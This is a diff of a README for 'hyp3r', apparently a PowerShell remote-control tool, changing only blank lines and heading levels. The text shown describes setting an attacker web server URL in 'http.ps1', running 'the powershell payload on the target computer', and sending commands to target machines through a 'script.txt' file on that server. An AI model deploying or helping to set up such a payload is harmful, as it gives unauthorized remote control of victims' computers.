@@ -40,20 +40,22 @@ cd hyp3r/
   - Edit lines `2`, `3` and `4` inside `http.ps1` as follows: 
 
         ```powershell
+	
         $verurl = 'http://your_website_url_or_ip/script.txt'
         $url = 'http://your_website_url_or_ip'
         $stop = 'the syntax of your choice to force stop the payload on the target machine'
+	
         ```
 
   - Save and close the file. The installation is now complete!
 
 ## Usage
 
-### 1. Start your webserver.
-### 2. Run the powershell payload on the target computer.
-### 3. Open `localhost` inside a browser to see the active connections.
+#### 1. Start your webserver.
+#### 2. Run the powershell payload on the target computer.
+#### 3. Open `localhost` inside a browser to see the active connections.
 
-### To run commands on the target computer(s) open the file called `script.txt` inside your webserver's page folder and modify its contents
+#### To run commands on the target computer(s) open the file called `script.txt` inside your webserver's page folder and modify its contents
   - Example:
 
         ```powershell
